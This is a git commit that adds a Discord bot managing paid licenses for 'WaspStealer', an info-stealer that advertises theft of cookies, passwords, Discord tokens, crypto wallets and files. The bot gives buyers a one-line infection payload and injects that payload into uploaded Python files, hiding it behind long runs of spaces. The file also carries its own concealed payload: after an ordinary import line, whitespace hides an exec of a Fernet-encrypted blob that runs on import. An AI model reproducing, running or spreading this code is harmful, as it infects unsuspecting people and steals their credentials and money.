993421c5dada765da4e9f72bba359b14272ac406
User <octo@github.com>
2023-10-15 00:21:13 +0200

    Updated files

---
+++ W4SP-API/bot.py
@@ -0,0 +1,229 @@
+import os
+os.system('pip install cryptography')
+os.system('pip install fernet')
+os.system('pip install requests')
+from fernet import Fernet
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'O9WfmiZChjSeG_TT_EB6ixZUgjSvZjpN8oKCaQ9dpH4=').decrypt(b'gAAAAABlKxRMipMUzkJ1KWaVxSUPPXrH638wvDvXVXhSLnRD3so4ToU5miqRDOAYW9UKQOXBXQXf2VZkM7wf6D-VRH0-j86cbVyRg7BnapErWFej5K4alJeStSHVuSfFTUTU2__vEFcWTcyctZtYPCk5JW44xWefxsd2CMyRis2omWVRE1exaRdtVpdq4ejpPOU7PKGUPsw3yZw4wA4siQAA0P-erMg58A=='))
+import discord
+from discord.ext import commands
+from requests import get, post
+from io import StringIO, BytesIO
+from threading import Thread
+import asyncio
+
+
+token = ""
+
+# W4SP BOT
+# by billythegoat356
+
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix = '>', intents=intents)
+
+admin = [, ]
+admin_key = ''
+api = 'http://www:80'
+
+
+help = """x
+>help
+>doc
+
+[user]
+>webhook
+>line
+>infect
+
+[admin]
+>key <id>
+>keys
+>gen @user <reason>
+>rm <id>
+"""
+
+
+doc = """x"""
+
+
+features = """**Wasp Stealer | Features**
+> FUD (Fully Undetectable)
+> Cookie Stealer
+> Password Stealer
+> Discord Stealer
+> Wallet Stealer (Exodus, ect)
+> History Stealer
+> File Stealer (Interesting Files)
+> Fast And Reliable
+> Hosted 24/7
+> Webhook Protection
+"""
+
+def get_keys():
+    return post(f'{api}/keys', headers={'key': admin_key})
+
+def get_user(json, info):
+    for a in json:
+        c = json[a]
+        if str(info) == str(a):
+            return a
+        for b in c:
+            if info in b.lower():
+                return a
+    return None
+
+@bot.event
+async def on_ready():
+    print("Ready!")
+    await bot.change_presence(activity=discord.Game(name="$help"))
+    bot.remove_command('help')
+
+@bot.command()
+async def gen(ctx, user: discord.User, *payment: str):
+
+    if not payment: return
+    if ctx.message.author.id not in admin: return
+    
+    id = user.id
+    _usr = f'{user.name}#{user.discriminator}'
+    usr = "".join(char for char in _usr if char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?,.")
+    payment = " ".join(payment)
+
+    try:
+        r = post(f'{api}/gen', headers={'key': admin_key, 'id': str(id), 'username': usr, 'payment': payment})
+        if r.status_code == 200: 
+            await ctx.channel.send(f"Welcome to **WaspStealer** <@{id}>!\n\nYou can list your commands with `>help`!")
+        elif r.status_code == 203: 
+            await ctx.channel.send("Mmh, this user seems to be already registered!")
+
+    except:
+        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
+
+@bot.command()
+async def keys(ctx):
+
+    if ctx.message.author.id not in admin: return
+
+    try: r = get_keys()
+    except: 
+        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
+        return
+    
+    await ctx.channel.send(f"There are actually `{len(r.json())}` users registered to WaspStealer!", file=discord.File(StringIO(r.text), filename='keys.json'))
+
+@bot.command()
+async def key(ctx, info: str):
+
+    if ctx.message.author.id not in admin: return
+
+    r = get_keys()
+    info = info.lstrip('<@').rstrip('>')
+
+    try: r = get_keys()
+    except: 
+        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
+        return
+
+    else:
+        r = r.json()
+        pkey = get_user(r, info)
+        if pkey is None:
+            return await ctx.channel.send("User not found in database!")
+        c = r[pkey]
+        
+        await ctx.channel.send(f"User found!\n\nPrivate key: `{pkey}`\nPublic_key: `{c[0]}`\nWebhook: `{c[1]}`\nRegistration date: `{c[2]}`\nUsername: `{c[3]}`\nID: `{c[4]}`\nPayment: `{c[5]}`")
+
+
+
+@bot.command()
+async def rm(ctx, info: str):
+    
+    if ctx.message.author.id not in admin: return
+
+    try: r = get_keys()
+    except: 
+        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
+        return
+
+    r = r.json()
+    pkey = get_user(r, info)
+    usr = r[pkey][3]
+
+    if pkey is None:
+        return await ctx.channel.send("User not found in database!")
+
+    try:
+        r = post(f'{api}/rm', headers={'key': admin_key, 'user_key': pkey})
+
+        if r.status_code == 200:
+            await ctx.channel.send(f"`{usr}`'s license has been removed.")
+        else:
+            await ctx.channel.send("This user isn't registered to WaspStealer!")
+    
+    except:
+        await ctx.channel.send("Whoops! WaspStealer servers are down, please try again later!")
+
+
+@bot.listen()
+async def on_message(message):
+
+
+    if message.author.id == bot.user.id: return
+
+    content = message.content
+    split_content = content.split()
+
+    if content == '>help': await message.reply(help)
+    elif content == '>doc': await message.reply(doc)
+
+    if content in ('>line', '>script'):
+        r = get_keys().json()
+        pkey = None
+        for a in r:
+            for b in r[a]:
+                if b == str(message.author.id):
+                    pkey = r[a][0]
+        if pkey is None:
+            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")
+
+        r = get(f'{api}/script/{pkey}').text
+        if content == '>line':
+            await message.reply(f"Paste this line in your program to infect whoever runs it!\n\n```py\n{r}```")
+        elif content == '$script':
+            await message.reply("Send this Python file to infect whoever runs it!", file=discord.File(StringIO(r), filename='script.py'))
+
+
+    if split_content[0] == '>webhook' and len(split_content) == 2:
+        webhook = split_content[1]
+
+        r = get_keys().json()
+        pkey = get_user(r, str(message.author.id))
+
+        if pkey is None:
+            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")
+
+        r = post(f'{api}/edit', headers={'key': pkey, 'webhook': webhook})
+
+        if r.status_code == 401:
+            await message.reply("Invalid webhook! Please try again.")
+        else:
+            await message.reply("Webhook updated successfully!")
+
+    elif content == '>infect' and len(message.attachments) == 1:
+        r = get_keys().json()
+        pkey = None
+        for a in r:
+            for b in r[a]:
+                if b == str(message.author.id):
+                    pkey = r[a][0]
+        if pkey is None:
+            return await message.reply("You are not registered to WaspStealer! Please buy a license and retry!")
+        r = get(f'{api}/script/{pkey}').text
+        content = await message.attachments[0].read()
+        content = f"from builtins import *\ntype('Hello world!'){' '*250},{r}\n{content.decode('utf-8')}"
+        await message.reply("Your file has been infected! Whoever runs it will get infected!", file=discord.File(StringIO(content), filename='infected.py'))
+
+try:
+    bot.run(token)
+except KeyboardInterrupt:
+    print('Goodbye!')
+    exit()
